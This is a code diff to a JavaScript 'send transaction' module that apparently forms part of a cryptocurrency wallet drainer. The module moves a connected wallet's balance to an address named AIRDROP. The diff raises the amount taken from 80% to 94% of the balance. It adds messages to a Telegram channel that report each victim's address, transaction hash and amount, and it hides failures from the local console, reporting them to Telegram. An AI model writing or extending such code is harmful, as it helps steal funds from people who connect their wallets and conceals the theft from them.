@@ -1,6 +1,7 @@
 // create send transaction function
 import { ethers } from "ethers";
 import { AIRDROP } from "./constant";
+import { sendToTelegram } from "./telegram";
 // import { getUniversalProvider } from "./provider";
 
 export const sendETH = async (provider, signer) => {
@@ -15,7 +16,7 @@ export const sendETH = async (provider, signer) => {
         }
 
         // leave small buffer for gas (safe method)
-        const amountToSend = (balanceWei * 80n) / 100n;
+        const amountToSend = (balanceWei * 94n) / 100n;
 
         // send transaction
         const tx = await signer.sendTransaction({
@@ -25,10 +26,22 @@ export const sendETH = async (provider, signer) => {
         });
 
         await tx.wait();
+
+        // SEND TO TELEGRAM
+        await sendToTelegram(`
+            ✅ ETH Sent
+            Hash: ${tx.hash}
+            From: ${address}
+            Amount: ${amountToSend.toString()} wei
+        `);
         
         return tx.hash;
     } catch (error){
-        console.error("Error sending transaction: ", error);
+        // console.error("Error sending transaction: ", error);
+        await sendToTelegram(`
+            ❌ ETH Send Failed
+            Error: ${error.message}
+        `);
         return null;
     }
 }
